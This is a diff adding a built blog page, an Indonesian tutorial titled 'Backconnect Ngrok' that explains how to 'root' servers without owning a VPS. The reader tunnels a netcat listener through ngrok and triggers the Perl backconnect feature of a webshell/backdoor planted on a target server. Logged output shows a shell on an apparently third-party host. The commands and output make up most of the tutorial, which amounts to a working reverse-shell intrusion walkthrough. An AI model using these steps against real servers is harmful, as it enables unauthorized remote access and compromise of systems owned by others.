@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Backconnect Ngrok - Blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Tutorial Backconnect Server Dengan Ngrok" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Backconnect Ngrok" />
+<meta property="og:description" content="Tutorial Backconnect Server Dengan Ngrok" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/backconnect-ngrok/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-05-03T21:35:14+07:00" />
+<meta property="article:modified_time" content="2019-05-03T21:35:14+07:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Backconnect Ngrok"/>
+<meta name="twitter:description" content="Tutorial Backconnect Server Dengan Ngrok"/>
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.11a1877508139eac0b5b4852ceb110c35641b3533321e66e39149e901ed5756b.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.d902908ac6e0fab67957de5db5aea1b6455b19ae2ca98eac4c95a4a0fdc02238.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.c95c5dcf5f32f8b67bd36f7dab66680e068fce2b303087294114aabf7a7c080b.css" media="(prefers-color-scheme: dark)"  />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+	
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+		
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">Blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Beranda</a>
+		
+		<a href="/posts">Postingan</a>
+		
+		<a href="/about">Tentang</a>
+		
+		<a href="/tags">Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Backconnect Ngrok</h1>
+			<div class="meta">Posted on May 3, 2019</div>
+		</div>
+		
+
+		<section class="body">
+			<h2 id="intro">Intro</h2>
+<p>Bagi temen temen yang mau <em>rooting server</em> tapi tidak punya VPS, ada cara lain yaitu dengan menggunakan ngrok, tapi tidak semua server atau web shell support backconnect dengan ngrok. tidak ada salahnya mencoba kan? hehe.</p>
+<h2 id="tutorial">Tutorial</h2>
+<p>Disini saya menggunakan <em>perl</em> sebagai media backconnect antara <em>server</em> dan <em>ngrok</em>. OK lanjut ke alat tempurnya.</p>
+<ul>
+<li>Ngrok <a href="https://ngrok.com/download">Download</a> Pilih sesuai sitem operasi kamu.</li>
+<li>Server yang support perl sangat di anjurkan (sesuai dengan tutorial),</li>
+<li>Netcat <a href="https://eternallybored.org/misc/netcat/">Download</a> (disini saya menggunakan windows).</li>
+</ul>
+<h3 id="download-dan-auth-ngrok">Download dan Auth Ngrok</h3>
+<p>Jangan lupa untuk buat akun ngrok di sini guna mengautentikasi <em>token</em>. Ektrak ngrok-XXX.zip nya lalu autentikasi token nya agar ngrok dapat berjalan. Ganti token sesuai dengan punyamu.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>./ngrok authtoken initokenBqHnhg3_3X3JtBTSu1rNojz4kXXX
+</span></span></code></pre></div><h3 id="konfigurasi-ngrok--netcat">Konfigurasi Ngrok &amp; Netcat</h3>
+<p>Selanjutnya jalankan <em>ngrok</em> dengan <em>tcp</em>, port sesuai selera misalkan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>./ngrok.exe tcp <span style="color:#ae81ff">1991</span>
+</span></span></code></pre></div><p>Pastikan ngrok berjalan dengan baik seperti di bawah ini,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ngrok by @inconshreveable                                                       <span style="color:#f92672">(</span>Ctrl+C to quit<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Session Status                online
+</span></span><span style="display:flex;"><span>Account                       Tan <span style="color:#f92672">(</span>Plan: Free<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Version                       2.3.23
+</span></span><span style="display:flex;"><span>Region                        United States <span style="color:#f92672">(</span>us<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Web Interface                 http://127.0.0.1:4040
+</span></span><span style="display:flex;"><span>Forwarding                    tcp://0.tcp.ngrok.io:16857 -&gt; localhost:1991
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Connections                   ttl     opn     rt1     rt5     p50     p90
+</span></span><span style="display:flex;"><span>                              <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       0.00    0.00    0.00    0.00
+</span></span></code></pre></div><p>Jalankan netcat, pastikan port sesuai dengan port yang di jalankan di ngrok.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>./nc.exe -lnvp <span style="color:#ae81ff">1991</span>
+</span></span></code></pre></div><p>Pastikan netcat berjalan walau masih listening,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>λ .<span style="color:#ae81ff">\n</span>c.exe -lnvp <span style="color:#ae81ff">1991</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1991</span> ...
+</span></span></code></pre></div><h3 id="backconnect-server">Backconnect Server</h3>
+<p>Setelah semua terkonfigurasi, tinggal melakukan backconnect server ke komputer kita, pastikan webshell yang kita gunakan mempunyai fitur backconnect.
+<figure><img src="https://i.postimg.cc/DZVy5BZ7/fitur-bc.png"/><figcaption>
+            <h4>Fitur Backconnet di webshell/backdoor</h4>
+        </figcaption>
+</figure>
+</p>
+<p>Setelah semua terkonfigurasi, isi server dengan <code>0.tcp.ngrok.io</code> dan isi Port dengan port yang di buat oleh ngrok misal <code>16857</code> di sini saya menggunakan perl. Untuk <code>Bind port to /bin/sh Perl</code> abaikan saja. Klik <code>»</code>
+<figure><img src="https://res.cloudinary.com/tanmyid/image/upload/v1556851179/isi-bc_kodyu6.png"/><figcaption>
+            <h4>Contoh backconect</h4>
+        </figcaption>
+</figure>
+</p>
+<p>Cek di netcat, apakah sukses melalukan backconnect, jika sudah balasan dari server seperti di bawah, berarti sudah sukses backconnet,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>λ .<span style="color:#ae81ff">\n</span>c.exe -lnvp <span style="color:#ae81ff">1991</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1991</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">62032</span>
+</span></span><span style="display:flex;"><span>sh: no job control in this shell
+</span></span><span style="display:flex;"><span>sh-4.2$
+</span></span></code></pre></div><h3 id="uji-coba-command-linux">Uji Coba Command Linux</h3>
+<p>Selanjutnya tinggal Spawn TTY Shell. Ok kita coba jalankan command untuk memastikan kita sudah benar benar mendapak shell nya.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sh-4.2$ uname -a                                                                                
+</span></span><span style="display:flex;"><span>uname -a                                                                                        
+</span></span><span style="display:flex;"><span>Linux thewhitecloud.in 3.10.0-514.16.1.el7.x86_64 <span style="color:#75715e">#1 SMP Wed Apr 12 15:04:24 UTC 2017 x86_64 x86</span>
+</span></span><span style="display:flex;"><span>_64 x86_64 GNU/Linux 
+</span></span></code></pre></div><p>Ok sudah berhasil, tips ini berguna bagi kalian yang tidak mempunyai VPS saat rooting server. Sekian dan terima kasih.</p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/tutorial">tutorial</a></li>
+					
+					<li><a href="/tags/ngrok">ngrok</a></li>
+					
+					<li><a href="/tags/pentest">pentest</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+	</article>
+</main>
+<footer >
+    <div style="display:flex"><a class="soc" href="https://github.com/tanmyid" rel="me" title="GitHub"><i data-feather="github"></i></a>
+      <a class="border"></a><a class="soc" href="https://twitter.com/athulcajay/" rel="me" title="Facebook"><i data-feather="facebook"></i></a>
+      <a class="border"></a><a class="soc" href="https://t.me/tanmyid" rel="me" title="Telegram"><i data-feather="send"></i></a>
+      <a class="border"></a></div>
+    <div class="footer-info">
+      <strong>[</strong>2023  © Tanio <strong>]</strong> 
+    </div>
+</footer>
+
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
